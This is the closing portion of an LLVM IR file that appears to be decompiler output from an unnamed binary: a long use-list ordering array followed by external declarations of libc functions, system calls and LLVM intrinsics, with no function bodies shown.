2221, 2222, 2223, 2224, 81, 82, 1838, 2229, 2230, 83, 84, 85, 1839, 2231, 2232, 2233, 2234, 2235, 2236, 2237, 2238, 2239, 2240, 2241, 2242, 2243, 2244, 2245, 2246, 2247, 2248, 170, 2392, 2393, 171, 2394, 2395, 2396, 86, 135, 295, 145, 1840, 136, 2249, 172, 2250, 26, 137, 128, 2251, 269, 173, 2252, 129, 2253, 1841, 2254, 380, 2255, 2256, 2257, 2258, 2259, 2260, 2261, 2262, 174, 1842, 2263, 2264, 2265, 2266, 175, 2267, 1843, 176, 260, 381, 177, 1844, 1845, 1846, 296, 2268, 2269, 2270, 2271, 297, 284, 285, 2272, 2273, 2274, 2275, 2276, 2277, 1847, 298, 2278, 178, 1848, 2279, 179, 299, 300, 2280, 2281, 1849, 2282, 2283, 2284, 2285, 121, 2467, 2468, 2469, 2470, 130, 270, 138, 2286, 271, 1850, 1851, 1852, 2287, 180, 2288, 2404, 2419, 2420, 2421, 382, 2422, 2072, 2423, 2472, 1931, 2473, 2474, 2475, 1932, 2476, 2424, 2425, 2477, 181, 2478, 2489, 2490, 27, 150, 1853, 28, 1854, 1855, 2501, 2505, 272, 2506, 182, 1728, 383, 384, 4, 2479, 2480, 2481, 183, 1892, 1775, 184, 1856, 2073, 5, 301, 302, 185, 2074, 2075, 186, 187, 2077, 2076, 2078, 2079, 385, 1729, 2080, 2082, 2081, 2083, 2482, 2483, 188, 1857, 2488, 1965, 1966, 1967, 1968, 1858, 1859, 1969, 362, 1860, 303, 189, 190, 191, 386, 387, 131, 388, 2085, 2084, 389, 2092, 192, 193, 1861, 1933, 1862, 1934, 194, 1863, 195, 1864, 2094, 87, 2095, 2096, 2097, 6, 1865, 2112, 390, 1935, 1936, 1937, 1938, 1866, 196, 2491, 1730, 197, 304, 2493, 2496, 2495, 2428, 2429, 2430, 2431, 2432, 305, 2433, 2434, 2435, 391, 2426, 392, 2427, 393, 1867, 1868, 394, 1731, 1869, 395, 1732, 198, 1870, 2436, 2437, 199, 200, 396, 1733, 147, 2438, 2439, 2440, 201, 202, 397, 1734, 146, 2441, 273, 2442, 132, 2443, 2444, 2446, 1871, 2445, 7, 1939, 8, 2494, 2086, 2087, 2088, 2089, 2091, 2090, 9, 306, 2405, 2406, 2407, 2366, 1872, 307, 2367, 1873, 2368, 2369, 2370, 2372, 2373, 2374, 2375, 2376, 2377, 2378, 2379, 2397, 2380, 203, 204, 1874, 1875, 308, 2502, 2504, 29, 205, 2289, 2290, 148, 2291, 206, 1876, 2292, 274, 139, 2293, 88, 2371, 64, 309, 310, 207, 2294, 2295, 2296, 2297, 2298, 2299, 2300, 2301, 2302, 2303, 2304, 2305, 208, 1877, 2306, 311, 2307, 2308, 2309, 2310, 2311, 30, 31, 1878, 286, 287, 2312, 2313, 2314, 2315, 32, 2316, 2317, 2318, 33, 1879, 2319, 34, 35, 209, 1880, 2320, 2321, 2322, 2325, 2323, 2324, 36, 65, 89, 2326, 2327, 2328, 2329, 363, 2330, 2331, 210, 2332, 211, 2333, 1881, 275, 2334, 212, 2335, 1882, 2336, 2337, 2339, 2340, 2341, 2342, 2343, 2344, 213, 1883, 1884, 214, 2345, 2346, 1885, 2347, 2348, 2349, 2350, 2351, 1886, 2352, 2353, 312, 1887, 313, 2354, 2355, 2356, 2357, 2358, 2359, 37, 90, 91, 92, 1888, 2360, 215, 1889, 2361, 1735, 2362, 2363, 216, 1890, 133, 63, 122, 2338, 276, 2364, 2365, 2484, 2485, 277, 2487, 2486, 93, 398, 314, 2093, 2471, 217, 2098, 2492, 1940, 2383, 2403, 1941, 2410, 2497, 149, 315, 2465, 2503, 2411, 2466, 2500, 2412, 2120, 2413, 2414, 1942, 1957, 2498, 2499, 261, 1943, 262, 1944, 1946, 1945, 1947, 1948, 1949, 38, 218, 316, 399, 219, 1777, 1950, 220, 317, 1951, 1952, 278, 400, 1736, 1953, 401, 221, 1954, 222, 223, 224, 318, 403, 404, 1955, 1956, 402, 406, 407, 405, 225, 336, 95, 1959, 408, 1958, 410, 411, 94, 409, 412, 413, 226, 1960, 319, 1961, 364, 1962, 1963, 1964, 320, 140, 438, 1737, 1779, 443, 444, 321, 282, 283, 1778, 1970, 1780, 445, 446, 435, 1738, 1971, 1973, 436, 1739, 437, 1740, 1972, 103, 1974, 365, 1975, 1976, 1977, 1978, 1781, 447, 448, 432, 1741, 1979, 1981, 433, 1742, 434, 1743, 1980, 102, 1982, 1782, 449, 450, 429, 1744, 1983, 1985, 430, 1745, 431, 1746, 1984, 101, 1986, 1783, 451, 452, 426, 1987, 1989, 427, 428, 1988, 100, 1990, 1784, 453, 454, 423, 1747, 1991, 1993, 424, 1748, 425, 1749, 1992, 99, 1994, 1785, 455, 456, 420, 1750, 1995, 1997, 421, 1751, 422, 1752, 1996, 98, 1998, 1999, 2000, 2001, 2002, 2003, 2004, 1786, 457, 458, 417, 1753, 2005, 2007, 418, 1754, 419, 1755, 2006, 97, 2008, 1787, 459, 460, 414, 1756, 2009, 2011, 415, 1757, 416, 1758, 2010, 96, 2012, 1788, 461, 462, 439, 1759, 1789, 1790, 463, 464, 440, 1760, 227, 2013, 2014, 1791, 465, 466, 2015, 2016, 1792, 467, 468, 1793, 469, 470, 441, 1761, 2017, 1794, 471, 472, 442, 1762, 2018, 1795, 473, 474, 1796, 475, 476, 1797, 499, 500, 104, 2029, 40, 2019, 2020, 2021, 1763, 338, 2022, 2023, 2024, 2025, 1764, 337, 2026, 2027, 2028, 39, 2030, 2031, 2032, 16, 105, 2039, 42, 2033, 2034, 2035, 1765, 339, 2036, 2037, 2038, 41, 2040, 2041, 2042, 17, 2044, 340, 2045, 43, 341, 2046, 263, 2047, 1798, 477, 478, 1799, 479, 480, 1800, 481, 482, 1801, 483, 484, 1802, 485, 486, 264, 1803, 487, 488, 2048, 366, 2049, 2050, 2051, 2052, 322, 2053, 1766, 2054, 2055, 265, 141, 2056, 2057, 44, 343, 2058, 367, 2059, 2060, 2061, 2062, 10, 2063, 323, 2064, 228, 45, 342, 2065, 2066, 2067, 2068, 288, 490, 229, 489, 1767, 1768, 230, 46, 2069, 2070, 47, 66, 231, 232, 233, 2071, 324, 325, 234, 266, 1893, 1894, 1895, 1896, 1897, 1898, 1899, 1900, 1901, 1902, 1903, 1904, 1905, 1906, 1907, 1908, 1909, 1910, 1911, 1912, 1913, 1914, 1915, 1769, 1916, 1917, 1770, 347, 1918, 1919, 344, 345, 346, 1920, 1921, 1771, 492, 1922, 2099, 2100, 108, 11, 491, 2101, 106, 107, 326, 1772, 12, 48, 49, 2102, 109, 67, 2103, 348, 368, 235, 236, 237, 349, 1773, 2104, 493, 2105, 2106, 2107, 327, 2108, 114, 2109, 2110, 2111, 68, 110, 111, 112, 113, 1774, 2113, 238, 239, 240, 241, 2114, 2116, 2117, 2118, 242, 2119, 243, 244, 245, 350, 2115, 369, 494, 495, 328, 351, 329, 13, 330, 1804, 496, 2121, 246, 247, 248, 249, 331, 2122, 250, 251, 352, 2123, 2124, 252, 289, 2381, 497, 498, 2382, 2384, 2385, 2386, 1805, 353, 253, 254, 355, 2387, 255, 354, 2388, 115, 50, 69, 51, 2389, 332, 116, 117, 501, 124, 2391, 333, 2390, 503, 504, 118, 502, 505, 506, 2398, 2399, 370, 2400, 2401, 52, 2402, 53, 371, 119, 1806, 2408, 256, 257, 507, 2409, 258, 334, 2415, 2416, 2417, 2418, 335, 54, 2447, 2448, 2449, 508, 509, 2459, 55, 56, 123, 57, 358, 359, 2450, 2451, 2452, 2453, 279, 356, 357, 360, 2454, 2455, 2456, 2457, 58, 59, 120, 2458, 372, 60, 61, 2460, 2461, 361, 1891, 14, 2462, 2463, 2464, 259, 1923, 280, 510, 511, 512, 513, 514, 515, 516, 517, 518, 519, 520, 521, 522, 523, 524, 525, 526, 527, 528, 529, 530, 531, 532, 533, 534, 535, 536, 537, 538, 539, 540, 541, 542, 543, 544, 545, 546, 547, 548, 549, 550, 551, 552, 553, 554, 555, 556, 557, 558, 559, 560, 561, 562, 563, 564, 565, 566, 567, 568, 569, 570, 571, 572, 573, 574, 575, 576, 577, 578, 579, 580, 581, 582, 583, 584, 585, 586, 587, 588, 589, 590, 591, 592, 593, 594, 595, 596, 597, 598, 599, 600, 601, 602, 603, 604, 605, 606, 607, 608, 609, 610, 611, 612, 613, 614, 615, 616, 617, 618, 619, 620, 621, 622, 623, 624, 625, 626, 627, 628, 629, 630, 631, 632, 633, 634, 635, 636, 637, 638, 639, 640, 641, 642, 643, 644, 645, 646, 647, 648, 649, 650, 651, 652, 653, 654, 655, 656, 657, 658, 659, 660, 661, 662, 663, 664, 665, 666, 667, 668, 669, 670, 671, 672, 673, 674, 675, 676, 677, 678, 679, 680, 681, 682, 683, 684, 685, 686, 687, 688, 689, 690, 691, 692, 693, 694, 695, 696, 697, 698, 699, 700, 701, 702, 703, 704, 705, 706, 707, 708, 709, 710, 711, 712, 713, 714, 715, 716, 717, 718, 719, 720, 721, 722, 723, 724, 725, 726, 727, 728, 729, 730, 731, 732, 733, 734, 735, 736, 737, 738, 739, 740, 741, 742, 743, 744, 745, 746, 747, 748, 749, 750, 751, 752, 753, 754, 755, 756, 757, 758, 759, 760, 761, 762, 763, 764, 765, 766, 767, 768, 769, 770, 771, 772, 773, 774, 775, 776, 777, 778, 779, 780, 781, 782, 783, 784, 785, 786, 787, 788, 789, 790, 791, 792, 793, 794, 795, 796, 797, 798, 799, 800, 801, 802, 803, 804, 805, 806, 807, 808, 809, 810, 811, 812, 813, 814, 815, 816, 817, 818, 819, 820, 821, 822, 823, 824, 825, 826, 827, 828, 829, 830, 831, 832, 833, 834, 835, 836, 837, 838, 839, 840, 841, 842, 843, 844, 845, 846, 847, 848, 849, 850, 851, 852, 853, 854, 855, 856, 857, 858, 859, 860, 861, 862, 863, 864, 865, 866, 867, 868, 869, 870, 871, 872, 873, 874, 875, 876, 877, 878, 879, 880, 881, 882, 883, 884, 885, 886, 887, 888, 889, 890, 891, 892, 893, 894, 895, 896, 897, 898, 899, 900, 901, 902, 903, 904, 905, 906, 907, 908, 909, 910, 911, 912, 913, 914, 915, 916, 917, 918, 919, 920, 921, 922, 923, 924, 925, 926, 927, 928, 929, 930, 931, 932, 933, 934, 935, 936, 937, 938, 939, 940, 941, 942, 943, 944, 945, 946, 947, 948, 949, 950, 951, 952, 953, 954, 955, 956, 957, 958, 959, 960, 961, 962, 963, 964, 965, 966, 967, 968, 969, 970, 971, 972, 973, 974, 975, 976, 977, 978, 979, 980, 981, 982, 983, 984, 985, 986, 987, 988, 989, 990, 991, 992, 993, 994, 995, 996, 997, 998, 999, 1000, 1001, 1002, 1003, 1004, 1005, 1006, 1007, 1008, 1009, 1010, 1011, 1012, 1013, 1014, 1015, 1016, 1017, 1018, 1019, 1020, 1021, 1022, 1023, 1024, 1025, 1026, 1027, 1028, 1029, 1030, 1031, 1032, 1033, 1034, 1035, 1036, 1037, 1038, 1039, 1040, 1041, 1042, 1043, 1044, 1045, 1046, 1047, 1048, 1049, 1050, 1051, 1052, 1053, 1054, 1055, 1056, 1057, 1058, 1059, 1060, 1061, 1062, 1063, 1064, 1065, 1066, 1067, 1068, 1069, 1070, 1071, 1072, 1073, 1074, 1075, 1076, 1077, 1078, 1079, 1080, 1081, 1082, 1083, 1084, 1085, 1086, 1087, 1088, 1089, 1090, 1091, 1092, 1093, 1094, 1095, 1096, 1097, 1098, 1099, 1100, 1101, 1102, 1103, 1104, 1105, 1106, 1107, 1108, 1109, 1110, 1111, 1112, 1113, 1114, 1115, 1116, 1117, 1118, 1119, 1120, 1121, 1122, 1123, 1124, 1125, 1126, 1127, 1128, 1129, 1130, 1131, 1132, 1133, 1134, 1135, 1136, 1137, 1138, 1139, 1140, 1141, 1142, 1143, 1144, 1145, 1146, 1147, 1148, 1149, 1150, 1151, 1152, 1153, 1154, 1155, 1156, 1157, 1158, 1159, 1160, 1161, 1162, 1163, 1164, 1165, 1166, 1167, 1168, 1169, 1170, 1171, 1172, 1173, 1174, 1175, 1176, 1177, 1178, 1179, 1180, 1181, 1182, 1183, 1184, 1185, 1186, 1187, 1188, 1189, 1190, 1191, 1192, 1193, 1194, 1195, 1196, 1197, 1198, 1199, 1200, 1201, 1202, 1203, 1204, 1205, 1206, 1207, 1208, 1209, 1210, 1211, 1212, 1213, 1214, 1215, 1216, 1217, 1218, 1219, 1220, 1221, 1222, 1223, 1224, 1225, 1226, 1227, 1228, 1229, 1230, 1231, 1232, 1233, 1234, 1235, 1236, 1237, 1238, 1239, 1240, 1241, 1242, 1243, 1244, 1245, 1246, 1247, 1248, 1249, 1250, 1251, 1252, 1253, 1254, 1255, 1256, 1257, 1258, 1259, 1260, 1261, 1262, 1263, 1264, 1265, 1266, 1267, 1268, 1269, 1270, 1271, 1272, 1273, 1274, 1275, 1276, 1277, 1278, 1279, 1280, 1281, 1282, 1283, 1284, 1285, 1286, 1287, 1288, 1289, 1290, 1291, 1292, 1293, 1294, 1295, 1296, 1297, 1298, 1299, 1300, 1301, 1302, 1303, 1304, 1305, 1306, 1307, 1308, 1309, 1310, 1311, 1312, 1313, 1314, 1315, 1316, 1317, 1318, 1319, 1320, 1321, 1322, 1323, 1324, 1325, 1326, 1327, 1328, 1329, 1330, 1331, 1332, 1333, 1334, 1335, 1336, 1337, 1338, 1339, 1340, 1341, 1342, 1343, 1344, 1345, 1346, 1347, 1348, 1349, 1350, 1351, 1352, 1353, 1354, 1355, 1356, 1357, 1358, 1359, 1360, 1361, 1362, 1363, 1364, 1365, 1366, 1367, 1368, 1369, 1370, 1371, 1372, 1373, 1374, 1375, 1376, 1377, 1378, 1379, 1380, 1381, 1382, 1383, 1384, 1385, 1386, 1387, 1388, 1389, 1390, 1391, 1392, 1393, 1394, 1395, 1396, 1397, 1398, 1399, 1400, 1401, 1402, 1403, 1404, 1405, 1406, 1407, 1408, 1409, 1410, 1411, 1412, 1413, 1414, 1415, 1416, 1417, 1418, 1419, 1420, 1421, 1422, 1423, 1424, 1425, 1426, 1427, 1428, 1429, 1430, 1431, 1432, 1433, 1434, 1435, 1436, 1437, 1438, 1439, 1440, 1441, 1442, 1443, 1444, 1445, 1446, 1447, 1448, 1449, 1450, 1451, 1452, 1453, 1454, 1455, 1456, 1457, 1458, 1459, 1460, 1461, 1462, 1463, 1464, 1465, 1466, 1467, 1468, 1469, 1470, 1471, 1472, 1473, 1474, 1475, 1476, 1477, 1478, 1479, 1480, 1481, 1482, 1483, 1484, 1485, 1486, 1487, 1488, 1489, 1490, 1491, 1492, 1493, 1494, 1495, 1496, 1497, 1498, 1499, 1500, 1501, 1502, 1503, 1504, 1505, 1506, 1507, 1508, 1509, 1510, 1511, 1512, 1513, 1514, 1515, 1516, 1517, 1518, 1519, 1520, 1521, 1522, 1523, 1524, 1525, 1526, 1527, 1528, 1529, 1530, 1531, 1532, 1533, 1534, 1535, 1536, 1537, 1538, 1539, 1540, 1541, 1542, 1543, 1544, 1545, 1546, 1547, 1548, 1549, 1550, 1551, 1552, 1553, 1554, 1555, 1556, 1557, 1558, 1559, 1560, 1561, 1562, 1563, 1564, 1565, 1566, 1567, 1568, 1569, 1570, 1571, 1572, 1573, 1574, 1575, 1576, 1577, 1578, 1579, 1580, 1581, 1582, 1583, 1584, 1585, 1586, 1587, 1588, 1589, 1590, 1591, 1592, 1593, 1594, 1595, 1596, 1597, 1598, 1599, 1600, 1601, 1602, 1603, 1604, 1605, 1606, 1607, 1608, 1609, 1610, 1611, 1612, 1613, 1614, 1615, 1616, 1617, 1618, 1619, 1620, 1621, 1622, 1623, 1624, 1625, 1626, 1627, 1628, 1629, 1630, 1631, 1632, 1633, 1634, 1635, 1636, 1637, 1638, 1639, 1640, 1641, 1642, 1643, 1644, 1645, 1646, 1647, 1648, 1649, 1650, 1651, 1652, 1653, 1654, 1655, 1656, 1657, 1658, 1659, 1660, 1661, 1662, 1663, 1664, 1665, 1666, 1667, 1668, 1669, 1670, 1671, 1672, 1673, 1674, 1675, 1676, 1677, 1678, 1679, 1680, 1681, 1682, 1683, 1684, 1685, 1686, 1687, 1688, 1689, 1690, 1691, 1692, 1693, 1694, 1695, 1696, 1697, 1698, 1699, 1700, 1701, 1702, 1703, 1704, 1705, 1706, 1707, 1708, 1709, 1710, 1711, 1712, 1713, 1714, 1715, 1716, 1717, 1718, 1719, 1720, 1721, 1722, 1723, 1724, 1725, 1726, 1727, 2507, 2508, 2509, 2510, 2511, 2512, 2513, 2514 }
  uselistorder i32* @ebx, {}
}

; Function Attrs: nounwind readnone
declare i32 @llvm.ctlz.i32(i32, i1) #1

; Function Attrs: nounwind readnone
declare i32 @llvm.bswap.i32(i32) #1

declare i32 @_strlen(i8*) local_unnamed_addr

declare i8* @_memset(i8*, i32, i32) local_unnamed_addr

declare i8* @_memcpy(i8*, i8*, i32) local_unnamed_addr

declare i32 @_strncmp(i8*, i8*, i32) local_unnamed_addr

; Function Attrs: nounwind readnone
declare i16 @llvm.bswap.i16(i16) #1

declare i32 @unknown_0(i32) local_unnamed_addr

declare i32 @vfork() local_unnamed_addr

declare i32 @fcntl(i32, i32, ...) local_unnamed_addr

declare i32 @int80_syscall(i32) local_unnamed_addr

declare void @exit(i32) local_unnamed_addr

declare i32 @close(i32) local_unnamed_addr

declare i32 @fork(i32) local_unnamed_addr

declare i32 @getpid(i32) local_unnamed_addr

declare i32 @open(i8*, i32, ...) local_unnamed_addr

declare i32 @pipe([2 x i32]) local_unnamed_addr

declare i32 @read(i32, i32*, i32) local_unnamed_addr

declare i32 @setsid(i32) local_unnamed_addr

declare i32 @sigprocmask(i32, %_TYPEDEF_sigset_t*, %_TYPEDEF_sigset_t*) local_unnamed_addr

declare i32 @time(i32*) local_unnamed_addr

declare i32 @write(i32, i32*, i32) local_unnamed_addr

declare i32 @sigreturn(%sigcontext*) local_unnamed_addr

declare i32 @sigaction(i32, %sigaction*, %sigaction*) local_unnamed_addr

declare i32 @clock_getres(i32, %timespec*) local_unnamed_addr

declare i32 @execve(i8*, [1 x i8*], [1 x i8*]) local_unnamed_addr

declare i32 @nanosleep(%timespec*, %timespec*) local_unnamed_addr

declare i32 @poll(%pollfd*, i32, i32) local_unnamed_addr

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i64 @__decompiler_undefined_function_1() local_unnamed_addr

declare i8* @__decompiler_undefined_function_2() local_unnamed_addr

declare i8 @__decompiler_undefined_function_3() local_unnamed_addr

declare i16 @__decompiler_undefined_function_4() local_unnamed_addr

declare i16* @__decompiler_undefined_function_5() local_unnamed_addr

declare i8** @__decompiler_undefined_function_6() local_unnamed_addr

declare %_TYPEDEF_sigset_t* @__decompiler_undefined_function_7() local_unnamed_addr

declare %sigaction* @__decompiler_undefined_function_8() local_unnamed_addr

declare %timespec* @__decompiler_undefined_function_9() local_unnamed_addr

declare x86_fp80 @__decompiler_undefined_function_10() local_unnamed_addr

attributes #0 = { noreturn }
attributes #1 = { nounwind readnone }
